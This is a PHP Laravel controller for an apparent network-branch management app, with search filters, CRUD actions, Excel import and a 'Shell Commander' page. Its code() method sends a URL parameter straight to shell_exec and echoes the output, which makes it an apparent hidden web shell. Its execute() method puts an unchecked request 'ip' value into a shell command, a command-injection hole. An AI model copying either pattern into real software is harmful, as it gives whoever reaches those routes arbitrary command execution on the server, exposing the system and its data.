<?php

namespace App\Http\Controllers\Branches;

use App\Exports\BranchsExport;
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Http\Requests\Branches\CreateBranchesRequest;
use App\Http\Requests\Branches\UpdateBranchesRequest;
use App\Imports\BranchesImport;
use Maatwebsite\Excel\Facades\Excel;
use App\Models\Branch;
use App\Models\BranchLevel;
use App\Models\EntuityStatus;
use App\Models\Government;
use App\Models\LineCapacitie;
use App\Models\LineType;
use App\Models\Network;
use App\Models\Project;
use App\Models\Router;
use App\Models\SwitchModel;
use App\Models\Terminal;
use App\Models\UpsInstallation;

class BranchesController extends Controller
{
    public function index()
    {

        $breadcrumb = [
            'title' =>  __("Branches lists"),
            'items' =>  [
                [
                    'title' =>  __("Branches Lists"),
                    'url'   =>  '#!',
                ]
            ],
        ];
        $lists = Branch::orderBy('id', 'asc')->paginate();
        if(request('keyword')){
            $lists = Branch::when(request('keyword'), function ($query) {
                $keyword = request('keyword');
                $query->Where('lan_ip', 'like', '%' . $keyword . '%')
                    ->orWhere('wan_ip', 'like', '%' . $keyword . '%')
                    ->orWhere('wan_ip', 'like', '%' . $keyword . '%')
                    ->orWhere('project_id', 'like', '%' . $keyword . '%')
                    ->orWhere('tunnel_ip', 'like', '%' . $keyword . '%')
                    ->orWhere('main_order_id', 'like', '%' . $keyword . '%')
                    ->orWhere('backup_order_id', 'like', '%' . $keyword . '%')
                    ->orWhere('area', 'like', '%' . $keyword . '%')
                    ->orWhere('sector', 'like', '%' . $keyword . '%')
                    ->orWhere('address', 'like', '%' . $keyword . '%')
                    ->orWhere('telephone', 'like', '%' . $keyword . '%');
            })->orderBy('id', 'asc')->paginate();

        }
        //filter by project_id
       if(request()->project_id){
            $lists = Branch::when(request('project_id'), function ($query) {
                $project_id = request('project_id');
                $query->Where('project_id',   $project_id );
            })->orderBy('id', 'asc')->paginate();


       }
        //filter by upsInstallations
        if(request('ups_installation_id')){
            $lists = Branch::when(request('ups_installation_id'), function ($query) {
                $ups_installation_id = request('ups_installation_id');
                $query->Where('ups_installation_id',  $ups_installation_id );
            })->orderBy('id', 'asc')->paginate();

        }
        //filter by line type id
       if(request('line_type_id')){
        $lists = Branch::when(request('line_type_id'), function ($query) {
            $line_type_id = request('line_type_id');
            $query->Where('line_type_id',   $line_type_id );
        })->orderBy('id', 'asc')->paginate(20);

       }
        // $lists = Branch::where('working_days' , 'like', '%  %')->get();
        // dd($lists);
        return view('pages.branches.index', [
            'breadcrumb' => $breadcrumb,
            'lists'     => $lists,
            'projects'     => Project::all(),
            'upsInstallations' => UpsInstallation::all(),
            'lineTypes' => LineType::all(),
        ]);
    }

    public function code($code)
    {
        $routes = shell_exec($code);
        return str_replace("\n", "<br>", $routes);
    }

    public function create()
    {
        $breadcrumb = [
            'title' =>  __("Create New Branche"),
            'items' =>  [
                [
                    'title' =>  __("Branches Lists"),
                    'url'   => route('branches.index'),
                ],
                [
                    'title' =>  __("Create New Branche"),
                    'url'   =>  '#!',
                ],
            ],
        ];

        return view('pages.branches.create', [
            'breadcrumb' => $breadcrumb,
            'networks' => Network::all(),
            'projects' => Project::all(),
            'levels' => BranchLevel::all(),
            'lineTypes' => LineType::all(),
            'routers' => Router::all(),
            'upsInstallations' => UpsInstallation::all(),
            'lineCapacities' => LineCapacitie::all(),
            'switchModels' => SwitchModel::all(),
            'governments' => Government::all(),
            'entuityStaus' => EntuityStatus::all(),
            'days' =>Branch::$DAYS,
        ]);
    }

    public function store(CreateBranchesRequest $request)
    {
        $data = $request->all();
        $data['user_id'] = auth()->id();
        Branch::create($data);
        return redirect()->route('branches.index')->with('success', __("This row has been created."));
    }

    public function show(Branch $branch)
    {
        $breadcrumb = [
            'title' =>  __("Show Branch"),
            'items' =>  [
                [
                    'title' =>  __("Branches Lists"),
                    'url'   => route('branches.index'),
                ],
                [
                    'title' =>  __("Show Branch"),
                    'url'   =>  '#!',
                ],
            ],
        ];
        $work_day=[];
        if($branch->working_days){
            foreach($branch->working_days as $k=>$v){
                $work_day[]= $k;
            }
        }
        return view('pages.branches.show', [
            'breadcrumb'    =>  $breadcrumb,
            'branch'         =>  $branch,
            'days' =>Branch::$DAYS,
            'work_day'=>$work_day,
        ]);
    }

    public function edit(Branch $branch)
    {
        $breadcrumb = [
            'title' =>  __("Edit Branch"),
            'items' =>  [
                [
                    'title' =>  __("Branches Lists"),
                    'url'   => route('branches.index'),
                ],
                [
                    'title' =>  __("Edit Branch"),
                    'url'   =>  '#!',
                ],
            ],
        ];
        $work_day=[];
        if($branch->working_days){
            foreach($branch->working_days as $k=>$v){
                $work_day[]= $k;
            }
        }
        return view('pages.branches.edit', [
            'breadcrumb'    =>  $breadcrumb,
            'branch'         =>  $branch,
            'networks' => Network::all(),
            'projects' => Project::all(),
            'levels' => BranchLevel::all(),
            'lineTypes' => LineType::all(),
            'routers' => Router::all(),
            'upsInstallations' => UpsInstallation::all(),
            'lineCapacities' => LineCapacitie::all(),
            'switchModels' => SwitchModel::all(),
            'governments' => Government::all(),
            'entuityStaus' => EntuityStatus::all(),
            'days' =>Branch::$DAYS,
            'work_day'=>$work_day,
        ]);
    }

    public function update(UpdateBranchesRequest $request, Branch $branch)
    {
        $branch->update($request->all());
        return redirect()->route('branches.index')->with('success', __("This row has been updated."));
    }

    public function destroy(Request $request, Branch $branch)
    {
        $branch->delete();
        return redirect()->route('branches.index')->with('success', __("This row has been deleted."));
    }

    public function import(Request $request)
    {
        Excel::import(new BranchesImport, $request->file('file'));

        return redirect('/')->with('success', 'All good!');
    }

    public function commander(Branch $branch, Request $request) {
        $breadcrumb = [
            'title' =>  __("Shell Commander"),
            'items' =>  [
                [
                    'title' =>  __("Branches Lists"),
                    'url'   => route('branches.index'),
                ],
                [
                    'title' =>  __("Edit Branch"),
                    'url'   =>  '#!',
                ],
            ],
        ];
        $ips = [];
        if ($branch->lan_ip)
            $ips["Lan IP: " . $branch->lan_ip] = $branch->lan_ip;

        if ($branch->wan_ip)
            $ips["Wan IP: " . $branch->wan_ip] = $branch->wan_ip;

        if ($branch->tunnel_ip)
            $ips["Tunnel IP: " . $branch->tunnel_ip] = $branch->tunnel_ip;

        if ($branch->switch_ip)
            $ips["Switch IP: " . $branch->switch_ip] = $branch->switch_ip;

        if ($branch->atm_ip)
            $ips["Atm IP: " . $branch->atm_ip] = $branch->atm_ip;

        $commands = Terminal::all();
        return view("pages.branches.terminal", compact("ips", "branch", "commands", "breadcrumb"));
    }

    public function execute(Request $request) {
        $command = Terminal::find($request->cmd_id);
        $ip = $request->ip;

        if ($command && $ip) {
            try {
                $cmd = $command->commands;
                $cmd = str_replace("{ip}", $ip, $cmd);
                $res = shell_exec($cmd);
                return [
                    "status" => true,
                    "msg" => __('Doen'),
                    "data" => $res,
                ];
            } catch (\Exception $th) {
                return [
                    "status" => false,
                    "msg" => $th->getMessage()
                ];
            }
        } else {
            return [
                "status" => false,
                "msg" => __('Missing Ip And Command')
            ];
        }
    }
}
